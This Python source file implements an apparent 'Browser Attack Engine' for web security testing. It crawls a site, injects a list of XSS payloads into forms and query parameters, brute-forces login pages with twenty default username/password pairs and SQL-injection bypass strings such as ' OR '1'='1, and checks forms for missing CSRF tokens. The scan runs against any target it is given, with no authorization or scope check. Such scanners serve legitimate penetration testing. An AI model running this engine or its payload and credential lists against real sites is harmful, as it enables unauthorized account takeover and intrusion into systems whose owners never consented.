"""
Browser Attack Engine — Playwright/Selenium automation for web security testing
"""
from __future__ import annotations

import asyncio
import json
import time
import logging
import subprocess
import shutil
import hashlib
import re
import urllib.parse
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Optional, Any
from pathlib import Path

logger = logging.getLogger(__name__)

# ── Optional browser imports ──────────────────────────────────────────────────

_HAS_PLAYWRIGHT = False
_HAS_SELENIUM = False

try:
    from playwright.sync_api import sync_playwright, Page, Browser  # type: ignore
    _HAS_PLAYWRIGHT = True
except ImportError:
    pass

try:
    from selenium import webdriver  # type: ignore
    from selenium.webdriver.common.by import By  # type: ignore
    from selenium.webdriver.support.ui import WebDriverWait  # type: ignore
    from selenium.webdriver.support import expected_conditions as EC  # type: ignore
    from selenium.common.exceptions import (  # type: ignore
        TimeoutException, WebDriverException, NoSuchElementException,
        UnexpectedAlertPresentException,
    )
    _HAS_SELENIUM = True
except ImportError:
    pass


# ── Data models ───────────────────────────────────────────────────────────────

@dataclass
class BrowserFinding:
    """A security finding discovered via browser automation."""
    finding_id: str
    url: str
    vuln_type: str          # xss | csrf | open_redirect | auth_bypass | info_disclosure
    title: str
    severity: str           # critical | high | medium | low | info
    evidence: str           # description of how the vuln was triggered
    screenshot_path: Optional[str] = None
    payload: str = ""
    parameter: str = ""

    def to_dict(self) -> dict:
        return {
            "finding_id": self.finding_id,
            "url": self.url,
            "vuln_type": self.vuln_type,
            "title": self.title,
            "severity": self.severity,
            "evidence": self.evidence,
            "screenshot_path": self.screenshot_path,
            "payload": self.payload,
            "parameter": self.parameter,
        }


@dataclass
class LoginTestResult:
    """Result from testing a login page."""
    url: str
    success: bool
    credentials_tried: list[tuple[str, str]] = field(default_factory=list)
    default_creds_found: Optional[tuple[str, str]] = None
    auth_bypass_found: bool = False
    evidence: str = ""

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "success": self.success,
            "credentials_tried": [{"user": u, "pass": p} for u, p in self.credentials_tried],
            "default_creds_found": list(self.default_creds_found) if self.default_creds_found else None,
            "auth_bypass_found": self.auth_bypass_found,
            "evidence": self.evidence,
        }


# ── XSS payloads ─────────────────────────────────────────────────────────────

_XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "\"onmouseover=\"alert('XSS')",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<!--<script>alert('XSS')</script>-->",
    "<input autofocus onfocus=alert('XSS')>",
]

# Keywords that indicate a successful post-login page
_DASHBOARD_KEYWORDS = [
    "dashboard", "welcome", "logout", "sign out", "signout", "my account",
    "profile", "settings", "admin panel", "control panel", "logged in",
    "home page", "user home", "overview",
]

# Login page indicators
_LOGIN_KEYWORDS = [
    "login", "log in", "sign in", "signin", "authenticate", "username",
    "password", "forgot password", "remember me",
]

# Admin page indicators
_ADMIN_KEYWORDS = [
    "admin", "administrator", "management", "manage", "control panel",
    "backend", "cms", "dashboard", "staff", "superuser",
]


# ── Engine class ──────────────────────────────────────────────────────────────

class BrowserAttackEngine:
    """
    Orchestrates browser-based security tests using Playwright, Selenium,
    or a plain urllib fallback (in that priority order).
    """

    def __init__(self, screenshot_dir: str = "/tmp/oneinfinity_screenshots", request_delay: float = 0.5):
        self.screenshot_dir = Path(screenshot_dir)
        self.screenshot_dir.mkdir(parents=True, exist_ok=True)
        self.request_delay = request_delay

        # Detect available automation backends
        self.has_playwright = _HAS_PLAYWRIGHT and bool(shutil.which("playwright") or _HAS_PLAYWRIGHT)
        self.has_selenium = _HAS_SELENIUM and (
            bool(shutil.which("chromedriver")) or bool(shutil.which("geckodriver"))
        )

        if self.has_playwright:
            logger.info("BrowserAttackEngine: using Playwright")
        elif self.has_selenium:
            logger.info("BrowserAttackEngine: using Selenium")
        else:
            logger.info("BrowserAttackEngine: using urllib fallback (no browser available)")

        self._finding_counter = 0

    # ── Public API ────────────────────────────────────────────────────────────

    def test_xss(self, target_url: str, parameter: str, payload: str) -> Optional[BrowserFinding]:
        """
        Navigate to target_url with the XSS payload injected into `parameter`.
        Returns a BrowserFinding if the payload is reflected/triggered.
        """
        try:
            parsed = urllib.parse.urlparse(target_url)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            qs[parameter] = [payload]
            new_query = urllib.parse.urlencode(qs, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()

            html, status, _ = self._requests_navigate(test_url)
            if status == 0:
                return None

            if self._detect_xss_trigger(html, payload):
                self._finding_counter += 1
                fid = f"XSS-{self._finding_counter:04d}"
                shot = self.capture_screenshot(test_url, str(self.screenshot_dir / f"{fid}.png"))
                return BrowserFinding(
                    finding_id=fid,
                    url=test_url,
                    vuln_type="xss",
                    title=f"Reflected XSS in parameter '{parameter}'",
                    severity="high",
                    evidence=f"Payload reflected/triggered in HTTP {status} response. "
                             f"Payload: {payload}",
                    screenshot_path=shot,
                    payload=payload,
                    parameter=parameter,
                )
        except Exception as exc:
            logger.debug("test_xss error for %s: %s", target_url, exc)
        return None

    def test_login_bypass(
        self, login_url: str, credentials: Optional[list[tuple[str, str]]] = None
    ) -> LoginTestResult:
        """
        Attempt common/default credentials against a login form.
        Detects successful login by dashboard keywords in response.
        Also tests SQL-injection style auth bypass payloads.
        """
        result = LoginTestResult(url=login_url, success=False)
        cred_list = credentials if credentials else self._common_credentials()

        # First fetch the login page to get any CSRF token / form fields
        html, status, _ = self._requests_navigate(login_url)
        if status == 0:
            result.evidence = "Could not reach login page."
            return result

        csrf_token = self._extract_csrf_token(html)
        user_field, pass_field = self._detect_login_fields(html)

        for username, password in cred_list:
            result.credentials_tried.append((username, password))
            try:
                post_data: dict[str, str] = {
                    user_field: username,
                    pass_field: password,
                }
                if csrf_token:
                    post_data["csrf_token"] = csrf_token
                    post_data["_token"] = csrf_token
                    post_data["csrfmiddlewaretoken"] = csrf_token

                resp_html, resp_status, resp_headers = self._post_form(login_url, post_data)

                # Detect redirect to dashboard or dashboard keywords in body
                if resp_status in (301, 302, 303, 307, 308):
                    location = resp_headers.get("location", "")
                    if any(k in location.lower() for k in _DASHBOARD_KEYWORDS + ["home", "index", "/"]):
                        result.success = True
                        result.default_creds_found = (username, password)
                        result.evidence = (
                            f"Successful login with {username}/{password}. "
                            f"Redirected to: {location}"
                        )
                        return result

                if resp_html and any(kw in resp_html.lower() for kw in _DASHBOARD_KEYWORDS):
                    result.success = True
                    result.default_creds_found = (username, password)
                    result.evidence = (
                        f"Successful login with {username}/{password}. "
                        "Dashboard keywords found in response."
                    )
                    return result

                # Detect error keywords — if absent after POST, might be logged in
                error_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "try again"]
                if resp_html and not any(kw in resp_html.lower() for kw in error_keywords):
                    if resp_status == 200 and len(resp_html) > len(html) * 0.7:
                        # Response looks different from login page — possible bypass
                        result.auth_bypass_found = True
                        result.evidence = (
                            f"Possible auth bypass with {username}/{password}. "
                            "No error keywords and response differs from login page."
                        )

            except Exception as exc:
                logger.debug("Login attempt error (%s/%s): %s", username, password, exc)
            time.sleep(self.request_delay)

        # SQLi-style auth bypass payloads
        bypass_payloads = [
            ("' OR '1'='1", "' OR '1'='1"),
            ("admin'--", "anything"),
            ("' OR 1=1--", "' OR 1=1--"),
            ("\" OR \"1\"=\"1", "\" OR \"1\"=\"1"),
        ]
        for username, password in bypass_payloads:
            try:
                post_data = {user_field: username, pass_field: password}
                if csrf_token:
                    post_data["csrf_token"] = csrf_token
                resp_html, resp_status, resp_headers = self._post_form(login_url, post_data)
                if resp_html and any(kw in resp_html.lower() for kw in _DASHBOARD_KEYWORDS):
                    result.success = True
                    result.auth_bypass_found = True
                    result.evidence = (
                        f"SQL injection auth bypass succeeded with payload: {username}"
                    )
                    return result
            except Exception as exc:
                logger.debug("Bypass payload error: %s", exc)
            time.sleep(self.request_delay)

        if not result.evidence:
            result.evidence = f"Tested {len(result.credentials_tried)} credential pairs. No bypass found."
        return result

    def test_form_xss(self, page_url: str) -> list[BrowserFinding]:
        """
        Fetch the page, find all forms, inject XSS payloads into each text/search input.
        Returns list of BrowserFinding for any triggered payloads.
        """
        findings: list[BrowserFinding] = []
        try:
            html, status, _ = self._requests_navigate(page_url)
            if status == 0 or not html:
                return findings

            forms = self._parse_forms(html, page_url)
            for form in forms:
                action = form.get("action", page_url)
                method = form.get("method", "GET").upper()
                inputs = form.get("inputs", [])

                for xss_payload in _XSS_PAYLOADS[:5]:  # limit to 5 payloads per form
                    post_data: dict[str, str] = {}
                    injected_params: list[str] = []

                    for inp in inputs:
                        iname = inp.get("name", "")
                        itype = inp.get("type", "text").lower()
                        if not iname:
                            continue
                        if itype in ("text", "search", "email", "url", "tel", "textarea", ""):
                            post_data[iname] = xss_payload
                            injected_params.append(iname)
                        elif itype == "hidden":
                            post_data[iname] = inp.get("value", "")
                        elif itype in ("submit", "button", "reset", "image"):
                            pass
                        else:
                            post_data[iname] = inp.get("value", "test")

                    if not injected_params:
                        continue

                    try:
                        if method == "POST":
                            resp_html, resp_status, _ = self._post_form(action, post_data)
                        else:
                            qs = urllib.parse.urlencode(post_data)
                            test_url = f"{action}?{qs}" if "?" not in action else f"{action}&{qs}"
                            resp_html, resp_status, _ = self._requests_navigate(test_url)

                        if resp_html and self._detect_xss_trigger(resp_html, xss_payload):
                            self._finding_counter += 1
                            fid = f"FORM-XSS-{self._finding_counter:04d}"
                            shot = self.capture_screenshot(
                                action,
                                str(self.screenshot_dir / f"{fid}.png"),
                            )
                            findings.append(BrowserFinding(
                                finding_id=fid,
                                url=action,
                                vuln_type="xss",
                                title=f"Reflected XSS via form submission on {page_url}",
                                severity="high",
                                evidence=(
                                    f"XSS payload reflected in form response. "
                                    f"Params injected: {', '.join(injected_params)}. "
                                    f"Payload: {xss_payload}"
                                ),
                                screenshot_path=shot,
                                payload=xss_payload,
                                parameter=", ".join(injected_params),
                            ))
                    except Exception as exc:
                        logger.debug("Form XSS submission error: %s", exc)
                    time.sleep(self.request_delay)

        except Exception as exc:
            logger.debug("test_form_xss error for %s: %s", page_url, exc)
        return findings

    def capture_screenshot(self, url: str, output_path: str) -> Optional[str]:
        """
        Capture a screenshot of the given URL for evidence.
        Uses Playwright if available, then Selenium, otherwise saves a stub HTML file.
        """
        out = Path(output_path)
        out.parent.mkdir(parents=True, exist_ok=True)

        if self.has_playwright:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
                    page = browser.new_page()
                    page.goto(url, timeout=15000, wait_until="networkidle")
                    page.screenshot(path=str(out), full_page=True)
                    browser.close()
                return str(out)
            except Exception as exc:
                logger.debug("Playwright screenshot failed: %s", exc)

        if self.has_selenium:
            try:
                options = webdriver.ChromeOptions()
                options.add_argument("--headless")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                driver = webdriver.Chrome(options=options)
                driver.set_page_load_timeout(15)
                driver.get(url)
                driver.save_screenshot(str(out))
                driver.quit()
                return str(out)
            except Exception as exc:
                logger.debug("Selenium screenshot failed: %s", exc)

        # Fallback: save a stub text file as evidence
        stub_path = str(out).replace(".png", ".txt")
        try:
            Path(stub_path).write_text(
                f"Screenshot not available (no browser).\nURL: {url}\nTimestamp: {time.time()}\n"
            )
            return stub_path
        except Exception:
            return None

    def crawl_spa(self, target_url: str, max_pages: int = 50) -> list[str]:
        """
        Crawl a JavaScript-heavy SPA by clicking links and buttons to discover routes.
        Falls back to link extraction from static HTML if no browser is available.
        """
        discovered: list[str] = []
        visited: set[str] = set()
        base_parsed = urllib.parse.urlparse(target_url)
        base_origin = f"{base_parsed.scheme}://{base_parsed.netloc}"

        if self.has_playwright:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
                    page = browser.new_page()

                    def _record_request(req: Any) -> None:
                        u = req.url
                        if u not in visited and u.startswith(base_origin):
                            visited.add(u)
                            discovered.append(u)

                    page.on("request", _record_request)
                    page.goto(target_url, timeout=20000, wait_until="networkidle")
                    discovered.append(target_url)

                    queue = [target_url]
                    while queue and len(discovered) < max_pages:
                        current = queue.pop(0)
                        try:
                            page.goto(current, timeout=15000, wait_until="networkidle")
                            time.sleep(0.5)
                            # Collect all <a> hrefs
                            hrefs = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
                            for href in hrefs:
                                if href and href.startswith(base_origin) and href not in visited:
                                    visited.add(href)
                                    discovered.append(href)
                                    queue.append(href)

                            # Click buttons/nav elements to trigger SPA route changes
                            buttons = page.query_selector_all("button, [role='button'], nav a")
                            for btn in buttons[:10]:
                                try:
                                    btn.click(timeout=3000)
                                    time.sleep(0.3)
                                    current_url = page.url
                                    if current_url not in visited and current_url.startswith(base_origin):
                                        visited.add(current_url)
                                        discovered.append(current_url)
                                        queue.append(current_url)
                                except Exception:
                                    pass
                        except Exception as exc:
                            logger.debug("SPA crawl page error: %s", exc)

                    browser.close()
                return list(dict.fromkeys(discovered))  # deduplicate preserving order
            except Exception as exc:
                logger.debug("Playwright SPA crawl failed: %s", exc)

        # Fallback: static HTML link extraction
        queue_urls = [target_url]
        while queue_urls and len(discovered) < max_pages:
            url = queue_urls.pop(0)
            if url in visited:
                continue
            visited.add(url)
            html, status, _ = self._requests_navigate(url)
            if status == 0:
                continue
            discovered.append(url)
            for href in self._extract_links_simple(html, url, base_origin):
                if href not in visited:
                    queue_urls.append(href)
            time.sleep(self.request_delay)

        return list(dict.fromkeys(discovered))

    def test_csrf(self, target_url: str) -> Optional[BrowserFinding]:
        """
        Check whether forms on the page contain CSRF tokens.
        Returns a BrowserFinding if a form is missing CSRF protection.
        """
        try:
            html, status, _ = self._requests_navigate(target_url)
            if status == 0 or not html:
                return None

            forms = self._parse_forms(html, target_url)
            for form in forms:
                method = form.get("method", "GET").upper()
                if method != "POST":
                    continue
                inputs = form.get("inputs", [])
                input_names = [i.get("name", "").lower() for i in inputs]

                csrf_names = [
                    "csrf", "csrf_token", "_token", "csrfmiddlewaretoken",
                    "authenticity_token", "xsrf", "_csrf", "__requestverificationtoken",
                ]
                has_csrf = any(
                    any(csrf in iname for csrf in csrf_names)
                    for iname in input_names
                )
                # Also check for anti-forgery meta or headers via page source
                if not has_csrf:
                    meta_csrf = bool(re.search(r'csrf[_-]?token', html, re.IGNORECASE))
                    has_csrf = meta_csrf

                if not has_csrf:
                    self._finding_counter += 1
                    fid = f"CSRF-{self._finding_counter:04d}"
                    action = form.get("action", target_url)
                    return BrowserFinding(
                        finding_id=fid,
                        url=target_url,
                        vuln_type="csrf",
                        title="Missing CSRF Token in POST Form",
                        severity="medium",
                        evidence=(
                            f"Form at {action} (method=POST) has no detectable CSRF token field. "
                            f"Input fields found: {', '.join(input_names) or 'none'}."
                        ),
                        payload="",
                        parameter="",
                    )
        except Exception as exc:
            logger.debug("test_csrf error for %s: %s", target_url, exc)
        return None

    def scan_target(self, target: str, findings: Optional[list] = None) -> list[BrowserFinding]:
        """
        Full browser-based scan of a target:
          1. Crawl to discover pages
          2. Identify login pages and test for default credentials / auth bypass
          3. Test forms for XSS
          4. Check for CSRF token absence
          5. Capture screenshots of confirmed findings
        """
        if findings is None:
            findings = []

        all_findings: list[BrowserFinding] = list(findings)

        # Normalise target to URL
        if not target.startswith("http"):
            target = f"https://{target}"

        logger.info("BrowserAttackEngine: starting scan of %s", target)

        # Step 1: Discover pages
        pages = self.crawl_spa(target, max_pages=30)
        if not pages:
            pages = [target]
        logger.info("BrowserAttackEngine: discovered %d pages", len(pages))

        login_pages = [
            p for p in pages
            if any(kw in p.lower() for kw in ["login", "signin", "auth", "account"])
        ]

        # Step 2: Test login pages
        for lp in login_pages[:3]:
            try:
                result = self.test_login_bypass(lp)
                if result.success or result.auth_bypass_found:
                    self._finding_counter += 1
                    fid = f"AUTH-{self._finding_counter:04d}"
                    shot = self.capture_screenshot(lp, str(self.screenshot_dir / f"{fid}.png"))
                    severity = "critical" if result.default_creds_found else "high"
                    all_findings.append(BrowserFinding(
                        finding_id=fid,
                        url=lp,
                        vuln_type="auth_bypass",
                        title="Authentication Bypass / Default Credentials",
                        severity=severity,
                        evidence=result.evidence,
                        screenshot_path=shot,
                        payload=str(result.default_creds_found or "SQLi bypass"),
                        parameter="username/password",
                    ))
            except Exception as exc:
                logger.debug("Login scan error for %s: %s", lp, exc)
            time.sleep(self.request_delay)

        # Step 3 & 4: XSS and CSRF on all pages
        for page_url in pages[:20]:
            try:
                xss_results = self.test_form_xss(page_url)
                all_findings.extend(xss_results)
            except Exception as exc:
                logger.debug("Form XSS scan error for %s: %s", page_url, exc)

            try:
                csrf_result = self.test_csrf(page_url)
                if csrf_result:
                    all_findings.append(csrf_result)
            except Exception as exc:
                logger.debug("CSRF scan error for %s: %s", page_url, exc)

            # Step 5: XSS on URL query parameters
            parsed = urllib.parse.urlparse(page_url)
            qs = urllib.parse.parse_qs(parsed.query)
            for param in list(qs.keys())[:5]:
                for payload in _XSS_PAYLOADS[:3]:
                    try:
                        xss_f = self.test_xss(page_url, param, payload)
                        if xss_f:
                            all_findings.append(xss_f)
                            break  # one confirmed finding per param is enough
                    except Exception as exc:
                        logger.debug("URL XSS error: %s", exc)
                    time.sleep(self.request_delay)

        logger.info(
            "BrowserAttackEngine: scan complete — %d findings", len(all_findings)
        )
        return all_findings

    # ── Navigation helpers ────────────────────────────────────────────────────

    def _playwright_navigate(self, url: str) -> tuple[str, int, dict]:
        """Navigate using Playwright and return (html, status_code, headers)."""
        if not self.has_playwright:
            return "", 0, {}
        try:
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True, args=["--no-sandbox"])
                page = browser.new_page()
                response = page.goto(url, timeout=15000, wait_until="networkidle")
                html = page.content()
                status = response.status if response else 0
                headers = dict(response.headers) if response else {}
                browser.close()
                return html, status, headers
        except Exception as exc:
            logger.debug("_playwright_navigate error: %s", exc)
            return "", 0, {}

    def _selenium_navigate(self, url: str) -> tuple[str, int, dict]:
        """Navigate using Selenium and return (html, status_code, headers)."""
        if not self.has_selenium:
            return "", 0, {}
        try:
            options = webdriver.ChromeOptions()
            options.add_argument("--headless")
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(15)
            driver.get(url)
            html = driver.page_source
            driver.quit()
            return html, 200, {}
        except Exception as exc:
            logger.debug("_selenium_navigate error: %s", exc)
            return "", 0, {}

    def _requests_navigate(self, url: str, headers: Optional[dict] = None) -> tuple[str, int, dict]:
        """Navigate using urllib (plain HTTP fallback)."""
        try:
            req_headers = {
                "User-Agent": (
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                ),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            }
            if headers:
                req_headers.update(headers)

            req = urllib.request.Request(url, headers=req_headers)
            with urllib.request.urlopen(req, timeout=15) as resp:
                raw = resp.read()
                try:
                    html = raw.decode("utf-8", errors="replace")
                except Exception:
                    html = raw.decode("latin-1", errors="replace")
                return html, resp.status, dict(resp.headers)
        except urllib.error.HTTPError as exc:
            try:
                html = exc.read().decode("utf-8", errors="replace")
            except Exception:
                html = ""
            return html, exc.code, {}
        except Exception as exc:
            logger.debug("_requests_navigate error for %s: %s", url, exc)
            return "", 0, {}

    def _post_form(self, url: str, data: dict[str, str]) -> tuple[str, int, dict]:
        """POST form data to a URL and return (html, status, headers)."""
        try:
            encoded = urllib.parse.urlencode(data).encode("utf-8")
            req = urllib.request.Request(
                url,
                data=encoded,
                method="POST",
                headers={
                    "User-Agent": (
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                    ),
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                },
            )
            # Don't follow redirects automatically — we want the raw response
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor())
            urllib.request.install_opener(opener)

            with urllib.request.urlopen(req, timeout=15) as resp:
                raw = resp.read()
                html = raw.decode("utf-8", errors="replace")
                return html, resp.status, dict(resp.headers)
        except urllib.error.HTTPError as exc:
            location = exc.headers.get("Location", "") if exc.headers else ""
            return "", exc.code, {"location": location}
        except Exception as exc:
            logger.debug("_post_form error for %s: %s", url, exc)
            return "", 0, {}

    # ── Detection helpers ─────────────────────────────────────────────────────

    def _detect_xss_trigger(self, response_html: str, payload: str) -> bool:
        """
        Check whether the XSS payload appears to be reflected or triggered.
        Looks for raw reflection, alert() calls, onerror= attributes, and
        common XSS indicators in the response.
        """
        if not response_html or not payload:
            return False

        lower_html = response_html.lower()
        lower_payload = payload.lower()

        # Direct reflection of the full payload
        if payload in response_html:
            # Check that it's not inside a comment or encoded
            if "<script>" in payload.lower() and "<script>" in lower_html:
                return True
            if "onerror=" in lower_payload and "onerror=" in lower_html:
                return True
            if "onload=" in lower_payload and "onload=" in lower_html:
                return True
            if "alert(" in lower_payload and "alert(" in lower_html:
                return True
            if "javascript:" in lower_payload and "javascript:" in lower_html:
                return True
            if "svg" in lower_payload and "<svg" in lower_html:
                return True

        # Check for partial reflection of dangerous parts
        dangerous_patterns = [
            r"<script[^>]*>.*?alert\s*\(",
            r"onerror\s*=\s*['\"]?alert\s*\(",
            r"onload\s*=\s*['\"]?alert\s*\(",
            r"javascript\s*:\s*alert\s*\(",
            r"<svg[^>]*onload\s*=",
            r"<img[^>]*onerror\s*=",
            r"<iframe[^>]*src\s*=\s*['\"]?javascript:",
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, response_html, re.IGNORECASE | re.DOTALL):
                return True

        return False

    def _extract_csrf_token(self, html: str) -> Optional[str]:
        """Extract a CSRF token value from HTML (meta tags or hidden inputs)."""
        patterns = [
            r'<meta[^>]+name=["\']csrf[_-]?token["\'][^>]+content=["\']([^"\']+)["\']',
            r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+name=["\']csrf[_-]?token["\']',
            r'<input[^>]+name=["\']csrf[_-]?token["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+name=["\']_token["\'][^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+name=["\']csrfmiddlewaretoken["\'][^>]+value=["\']([^"\']+)["\']',
        ]
        for pat in patterns:
            m = re.search(pat, html, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def _detect_login_fields(self, html: str) -> tuple[str, str]:
        """
        Heuristically determine the name attributes of the username and password fields.
        Returns (user_field_name, pass_field_name).
        """
        user_field = "username"
        pass_field = "password"

        # Find password field name
        pass_match = re.search(
            r'<input[^>]+type=["\']password["\'][^>]*name=["\']([^"\']+)["\']',
            html, re.IGNORECASE
        )
        if not pass_match:
            pass_match = re.search(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\']password["\']',
                html, re.IGNORECASE
            )
        if pass_match:
            pass_field = pass_match.group(1)

        # Find username/email field — first text/email input
        user_candidates = re.findall(
            r'<input[^>]+(?:type=["\'](?:text|email)["\']|type=["\'])[^>]*name=["\']([^"\']+)["\']',
            html, re.IGNORECASE
        )
        # Also try name-first pattern
        if not user_candidates:
            user_candidates = re.findall(
                r'<input[^>]+name=["\']([^"\']+)["\'][^>]*type=["\'](?:text|email)["\']',
                html, re.IGNORECASE
            )
        if user_candidates:
            # Prefer names that look like username/email
            for candidate in user_candidates:
                if any(kw in candidate.lower() for kw in ["user", "email", "login", "name"]):
                    user_field = candidate
                    break
            else:
                user_field = user_candidates[0]

        return user_field, pass_field

    def _parse_forms(self, html: str, base_url: str) -> list[dict]:
        """
        Simple regex-based form parser. Returns list of dicts with
        keys: action, method, inputs (list of {name, type, value}).
        """
        forms = []
        for form_match in re.finditer(r'<form([^>]*)>(.*?)</form>', html, re.IGNORECASE | re.DOTALL):
            attrs_str = form_match.group(1)
            form_body = form_match.group(2)

            action_match = re.search(r'action=["\']([^"\']*)["\']', attrs_str, re.IGNORECASE)
            method_match = re.search(r'method=["\']([^"\']*)["\']', attrs_str, re.IGNORECASE)

            raw_action = action_match.group(1) if action_match else ""
            method = method_match.group(1).upper() if method_match else "GET"

            # Resolve relative action URL
            if raw_action:
                action = urllib.parse.urljoin(base_url, raw_action)
            else:
                action = base_url

            inputs = []
            for inp in re.finditer(r'<input([^>]*)>', form_body, re.IGNORECASE):
                inp_attrs = inp.group(1)
                name_m = re.search(r'name=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                type_m = re.search(r'type=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp_attrs, re.IGNORECASE)
                if name_m:
                    inputs.append({
                        "name": name_m.group(1),
                        "type": type_m.group(1) if type_m else "text",
                        "value": val_m.group(1) if val_m else "",
                    })

            # Textareas
            for ta in re.finditer(r'<textarea([^>]*)>', form_body, re.IGNORECASE):
                ta_attrs = ta.group(1)
                name_m = re.search(r'name=["\']([^"\']*)["\']', ta_attrs, re.IGNORECASE)
                if name_m:
                    inputs.append({"name": name_m.group(1), "type": "textarea", "value": ""})

            forms.append({"action": action, "method": method, "inputs": inputs})
        return forms

    def _extract_links_simple(self, html: str, base_url: str, base_origin: str) -> list[str]:
        """Extract in-scope links from HTML."""
        links = []
        for m in re.finditer(r'href=["\']([^"\'#?][^"\']*)["\']', html, re.IGNORECASE):
            href = m.group(1)
            full = urllib.parse.urljoin(base_url, href)
            if full.startswith(base_origin):
                links.append(full)
        return links

    # ── Credential list ───────────────────────────────────────────────────────

    def _common_credentials(self) -> list[tuple[str, str]]:
        """Return 20 commonly used default credential pairs."""
        return [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("admin", "admin123"),
            ("admin", "password123"),
            ("administrator", "administrator"),
            ("administrator", "password"),
            ("root", "root"),
            ("root", "toor"),
            ("root", "password"),
            ("test", "test"),
            ("test", "test123"),
            ("user", "user"),
            ("user", "password"),
            ("guest", "guest"),
            ("guest", "password"),
            ("demo", "demo"),
            ("operator", "operator"),
            ("support", "support"),
            ("admin", ""),
        ]


# ── Global singleton ──────────────────────────────────────────────────────────

browser_attack_engine = BrowserAttackEngine()
